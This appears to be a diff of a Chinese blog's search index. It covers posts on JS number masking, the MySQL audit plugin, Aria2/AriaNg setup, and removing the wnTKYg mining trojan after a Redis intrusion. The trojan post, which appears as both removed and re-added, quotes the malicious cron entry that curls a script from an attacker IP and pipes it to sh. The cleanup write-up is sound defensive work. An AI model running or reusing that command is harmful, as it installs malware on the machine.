+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"13812344321"</span>;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^(\d&#123;3&#125;)\d+(\d&#123;4&#125;)$/</span>;</span><br><span class="line">str = str.replace(reg, <span class="string">"$1 **** $2"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<blockquote>
+<p>138 **** 4321</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>JavaScript</category>
+      </categories>
+      <tags>
+        <tag>正则</tag>
       </tags>
   </entry>
   <entry>
@@ -1229,30 +1256,41 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>使用JS实现银行卡卡号和手机号的中间数字以星号表示</title>
-    <url>/2017/09/27/4.html</url>
-    <content><![CDATA[<p>在WAP开发过程中，肯定遇到过银行卡卡号和手机号的中间数字是星号的情况。下面来介绍一下如何使用原生JS实现这个功能。</p>
+    <title>MySql开启安全审计（audit审计插件）</title>
+    <url>/2017/09/28/6.html</url>
+    <content><![CDATA[<p>为了安全和操作的可追溯性考虑，越来越多的公司加入了审计功能。MySql5.5推出了相关的审计功能，到5.6.20功能进一步完善。下面来介绍一下如何开启MySql的audit审计功能。</p>
 <a id="more"></a>
-<p>废话不多说直接贴出银行卡卡号的代码：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"2222333344445555"</span>;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^(\d&#123;4&#125;)\d+(\d&#123;4&#125;)$/</span>;</span><br><span class="line">str = str.replace(reg, <span class="string">"$1 **** **** $2"</span>);</span><br></pre></td></tr></table></figure>
+<ol>
+<li>查看MySql插件目录，即plugin目录</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; show global variables like &#39;plugin_fir&#39;;</span><br></pre></td></tr></table></figure>
 
-<p>结果如下：</p>
-<blockquote>
-<p>2222 <strong>** **</strong> 5555</p>
-</blockquote>
-<p>下面是手机号的代码（其实只要照着银行卡的代码略作修改就可以了）：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"13812344321"</span>;</span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^(\d&#123;3&#125;)\d+(\d&#123;4&#125;)$/</span>;</span><br><span class="line">str = str.replace(reg, <span class="string">"$1 **** $2"</span>);</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>下载二进制包：<a href="https://bintray.com/mcafee/mysql-audit-plugin/release" target="_blank" rel="noopener">https://bintray.com/mcafee/mysql-audit-plugin/release</a>包含了5.1，5.5，5.6对应的二进制包（如果在plugin目录下有 <code>libaudit_plugin.so</code> 文件，就不用下载了），复制下载的so文件至MySql插件目录</li>
+<li>在线开启audit</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; INSTALL PLUGIN AUDIT SONAME &#39;libaudit_plugin.so&#39;;</span><br></pre></td></tr></table></figure>
 
-<p>结果如下：</p>
-<blockquote>
-<p>138 **** 4321</p>
-</blockquote>
+<ol start="4">
+<li>查看对应的版本</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; show global status like &#39;AUDIT_version&#39;;</span><br></pre></td></tr></table></figure>
+
+<p><em>有结果即安装成功！</em>  <strong>查看audit的相关命令：</strong><br><code>mysql &gt; show global variables like &#39;%audit%&#39;;</code><br><strong>设置相关的参数：</strong><br><code>mysql &gt; set global (填写查询后的audit相关命令) = ......;</code></p>
+<ol start="5">
+<li>开启audit功能（关闭就把On改成Off）</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; set global audit_json_file&#x3D;On;</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>执行Sql语句（对数据库数据有操作就行），看MySql数据目录的 <code>mysql-audit.json</code> 文件是否有变化 <code>（【MySql安装目录】/data/mysql-audit.json）</code></li>
+</ol>
 ]]></content>
       <categories>
-        <category>JavaScript</category>
+        <category>MySQL</category>
       </categories>
       <tags>
-        <tag>正则</tag>
+        <tag>audit审计插件</tag>
       </tags>
   </entry>
   <entry>
@@ -1293,41 +1331,57 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>MySql开启安全审计（audit审计插件）</title>
-    <url>/2017/09/28/6.html</url>
-    <content><![CDATA[<p>为了安全和操作的可追溯性考虑，越来越多的公司加入了审计功能。MySql5.5推出了相关的审计功能，到5.6.20功能进一步完善。下面来介绍一下如何开启MySql的audit审计功能。</p>
+    <title>Deepin安装Aria2+AriaNg</title>
+    <url>/2020/11/28/34.html</url>
+    <content><![CDATA[<p>Aria2是Linux系统的下载神器，支持多种下载协议，还能离线下载。AriaNg是可视化操作的前端，用来执行相关的Aria2命令。</p>
 <a id="more"></a>
-<ol>
-<li>查看MySql插件目录，即plugin目录</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; show global variables like &#39;plugin_fir&#39;;</span><br></pre></td></tr></table></figure>
+<h2 id="安装Aria2"><a href="#安装Aria2" class="headerlink" title="安装Aria2"></a>安装Aria2</h2><ul>
+<li><p>Deepin安装Aria2</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install -y aria2</span><br></pre></td></tr></table></figure>
 
-<ol start="2">
-<li>下载二进制包：<a href="https://bintray.com/mcafee/mysql-audit-plugin/release" target="_blank" rel="noopener">https://bintray.com/mcafee/mysql-audit-plugin/release</a>包含了5.1，5.5，5.6对应的二进制包（如果在plugin目录下有 <code>libaudit_plugin.so</code> 文件，就不用下载了），复制下载的so文件至MySql插件目录</li>
-<li>在线开启audit</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; INSTALL PLUGIN AUDIT SONAME &#39;libaudit_plugin.so&#39;;</span><br></pre></td></tr></table></figure>
 
-<ol start="4">
-<li>查看对应的版本</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; show global status like &#39;AUDIT_version&#39;;</span><br></pre></td></tr></table></figure>
 
-<p><em>有结果即安装成功！</em>  <strong>查看audit的相关命令：</strong><br><code>mysql &gt; show global variables like &#39;%audit%&#39;;</code><br><strong>设置相关的参数：</strong><br><code>mysql &gt; set global (填写查询后的audit相关命令) = ......;</code></p>
-<ol start="5">
-<li>开启audit功能（关闭就把On改成Off）</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql &gt; set global audit_json_file&#x3D;On;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="配置Aria2"><a href="#配置Aria2" class="headerlink" title="配置Aria2"></a>配置Aria2</h2><ol>
+<li><p>创建配置文件夹</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;root&#x2F;.aria2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建<code>aria2.session</code> 、 <code>aria2.log</code>和<code>aria2.conf</code>文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch &#x2F;root&#x2F;.aria2&#x2F;aria2.session</span><br><span class="line">touch &#x2F;root&#x2F;.aria2&#x2F;aria2.log</span><br><span class="line">touch &#x2F;root&#x2F;.aria2&#x2F;aria2.conf</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改<code>aria2.conf</code>文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#文件保存路径设置，请手动更改</span><br><span class="line">dir&#x3D;&#x2F;home&#x2F;data</span><br><span class="line"></span><br><span class="line">disk-cache&#x3D;32M</span><br><span class="line">file-allocation&#x3D;none</span><br><span class="line">continue&#x3D;true</span><br><span class="line">max-concurrent-downloads&#x3D;10</span><br><span class="line">max-connection-per-server&#x3D;5</span><br><span class="line">min-split-size&#x3D;10M</span><br><span class="line">split&#x3D;20</span><br><span class="line">disable-ipv6&#x3D;true</span><br><span class="line">input-file&#x3D;&#x2F;root&#x2F;.aria2&#x2F;aria2.session</span><br><span class="line">save-session&#x3D;&#x2F;root&#x2F;.aria2&#x2F;aria2.session</span><br><span class="line"></span><br><span class="line">## RPC相关设置 ##</span><br><span class="line"># 启用RPC, 默认:false</span><br><span class="line">enable-rpc&#x3D;true</span><br><span class="line"># 允许所有来源, 默认:false</span><br><span class="line">rpc-allow-origin-all&#x3D;true</span><br><span class="line"># 允许非外部访问, 默认:false</span><br><span class="line">rpc-listen-all&#x3D;true</span><br><span class="line"># 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同</span><br><span class="line">#event-poll&#x3D;select</span><br><span class="line"># RPC监听端口, 端口被占用时可以修改, 默认:6800</span><br><span class="line">rpc-listen-port&#x3D;6800</span><br><span class="line"># 设置的RPC授权令牌，在设置AriaNg时需要用到，请手动更改【自己随便改成什么都可以】</span><br><span class="line">rpc-secret&#x3D;&lt;TOKEN&gt;</span><br><span class="line"></span><br><span class="line">follow-torrent&#x3D;true</span><br><span class="line">listen-port&#x3D;6881-6999</span><br><span class="line">enable-dht&#x3D;true</span><br><span class="line">enable-peer-exchange&#x3D;true</span><br><span class="line">peer-id-prefix&#x3D;-TR2770-</span><br><span class="line">user-agent&#x3D;Transmission&#x2F;2.77</span><br><span class="line">seed-ratio&#x3D;0.1</span><br><span class="line">bt-seed-unverified&#x3D;true</span><br><span class="line">bt-save-metadata&#x3D;false</span><br></pre></td></tr></table></figure>
 
-<ol start="6">
-<li>执行Sql语句（对数据库数据有操作就行），看MySql数据目录的 <code>mysql-audit.json</code> 文件是否有变化 <code>（【MySql安装目录】/data/mysql-audit.json）</code></li>
+
+
+</li>
+</ol>
+<h2 id="开启Aria2"><a href="#开启Aria2" class="headerlink" title="开启Aria2"></a>开启Aria2</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aria2c --conf-path&#x3D;&#x2F;root&#x2F;.aria2&#x2F;aria2.conf -D</span><br><span class="line"></span><br><span class="line"># 关闭程序</span><br><span class="line">killall -9 aria2c</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="安装AriaNg"><a href="#安装AriaNg" class="headerlink" title="安装AriaNg"></a>安装AriaNg</h2><ol>
+<li><p>需要LNMP环境，可以使用LNMP一键安装包，安装环境</p>
+</li>
+<li><p>下载安装包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;mayswind&#x2F;AriaNg&#x2F;releases&#x2F;download&#x2F;1.1.3&#x2F;AriaNg-1.1.3.zip</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>解压后放到LNMP环境安装时，指定的网站根目录下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv AriaNg-1.1.3.zip &#x2F;home&#x2F;wwwroot&#x2F;default</span><br><span class="line">unzip AriaNg-1.1.3.zip</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
 </ol>
 ]]></content>
       <categories>
-        <category>MySQL</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>audit审计插件</tag>
+        <tag>Deepin</tag>
+        <tag>Aria2</tag>
+        <tag>AriaNg</tag>
       </tags>
   </entry>
   <entry>
@@ -1350,49 +1404,6 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
         <tag>PHPMailer</tag>
         <tag>smtp服务</tag>
         <tag>邮件发送类</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>清除wnTKYg挖矿木马病毒</title>
-    <url>/2017/10/08/8.html</url>
-    <content><![CDATA[<p>今天发现网站的后台进不去，而且前台的一些图片也显示不出来。远程连接服务器查看，原来有一个程序占用200%多的CPU，而且这个程序我不认识，好吧肯定是中病毒了。百度一下这个病毒wnTKYg。幸好百度给力啊，第一个就是解决方案，现在把方案和我自己的处理过程做个记录。</p>
-<a id="more"></a>
-<ol>
-<li><p>根据其他人的经验，这个是钻了redis的空子进来的，所以修改redis的相关配置</p>
-<ol>
-<li>修改默认端口</li>
-<li>设置密码</li>
-<li>设置 <code>bind xxx.xxx.xxx.xxx xxx.xxx.xxx.xxx</code></li>
-</ol>
-</li>
-<li><p>查看 <code>/root/.ssh</code> 下的文件，找到 <code>known_hosts</code> 中发现不认识的IP，用防火墙禁掉它</p>
-</li>
-<li><p>查看 <code>/var/spool/cron</code> 文件夹下的定时任务中是否有可疑内容，如果有就干掉它 下面是我的可疑内容情况：  </p>
-<blockquote>
-<p>*/5 * * * * curl -fsSL <a href="http://218.248.40.228:8443/i.sh?6" target="_blank" rel="noopener">http://218.248.40.228:8443/i.sh?6</a> | sh</p>
-</blockquote>
-<p> <strong><em>直接删除即可，然后看一下是否还有哦可疑文件，有就直接删除。（需要百分百确保是没有用的文件）</em></strong></p>
-</li>
-<li><p>查找相关的病毒文件，然后删除此文件</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name wnTKYg*</span><br><span class="line">rm -rf 相应目录下的wnTKYg文件</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>找到此病毒的守护进程，使用top发现可疑进程 <code>ddg.1007</code> ，找到后删除</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name ddg.*</span><br><span class="line">rm -rf 相应目录下的ddg.*文件</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>找到相应的 <code>wnTKYg</code> 进程杀掉（ <code>ddg.1007</code> 同理）</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pgrep wnTKYg | xargs kill -s 9</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<hr>
-<p>参考文章：<a href="http://blog.sina.com.cn/s/blog_c08907b10102wyyl.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_c08907b10102wyyl.html</a></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>木马病毒</tag>
-        <tag>Redis漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1444,6 +1455,49 @@ find ${backup_path} -type f -mtime +${save_days} -exec rm -rf {} \;</code></pre>
         <tag>LNMP</tag>
         <tag>一键脚本</tag>
         <tag>运行环境</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>清除wnTKYg挖矿木马病毒</title>
+    <url>/2017/10/08/8.html</url>
+    <content><![CDATA[<p>今天发现网站的后台进不去，而且前台的一些图片也显示不出来。远程连接服务器查看，原来有一个程序占用200%多的CPU，而且这个程序我不认识，好吧肯定是中病毒了。百度一下这个病毒wnTKYg。幸好百度给力啊，第一个就是解决方案，现在把方案和我自己的处理过程做个记录。</p>
+<a id="more"></a>
+<ol>
+<li><p>根据其他人的经验，这个是钻了redis的空子进来的，所以修改redis的相关配置</p>
+<ol>
+<li>修改默认端口</li>
+<li>设置密码</li>
+<li>设置 <code>bind xxx.xxx.xxx.xxx xxx.xxx.xxx.xxx</code></li>
+</ol>
+</li>
+<li><p>查看 <code>/root/.ssh</code> 下的文件，找到 <code>known_hosts</code> 中发现不认识的IP，用防火墙禁掉它</p>
+</li>
+<li><p>查看 <code>/var/spool/cron</code> 文件夹下的定时任务中是否有可疑内容，如果有就干掉它 下面是我的可疑内容情况：  </p>
+<blockquote>
+<p>*/5 * * * * curl -fsSL <a href="http://218.248.40.228:8443/i.sh?6" target="_blank" rel="noopener">http://218.248.40.228:8443/i.sh?6</a> | sh</p>
+</blockquote>
+<p> <strong><em>直接删除即可，然后看一下是否还有哦可疑文件，有就直接删除。（需要百分百确保是没有用的文件）</em></strong></p>
+</li>
+<li><p>查找相关的病毒文件，然后删除此文件</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name wnTKYg*</span><br><span class="line">rm -rf 相应目录下的wnTKYg文件</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找到此病毒的守护进程，使用top发现可疑进程 <code>ddg.1007</code> ，找到后删除</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name ddg.*</span><br><span class="line">rm -rf 相应目录下的ddg.*文件</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找到相应的 <code>wnTKYg</code> 进程杀掉（ <code>ddg.1007</code> 同理）</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pgrep wnTKYg | xargs kill -s 9</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<hr>
+<p>参考文章：<a href="http://blog.sina.com.cn/s/blog_c08907b10102wyyl.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_c08907b10102wyyl.html</a></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>木马病毒</tag>
+        <tag>Redis漏洞</tag>
       </tags>
   </entry>
 </search>
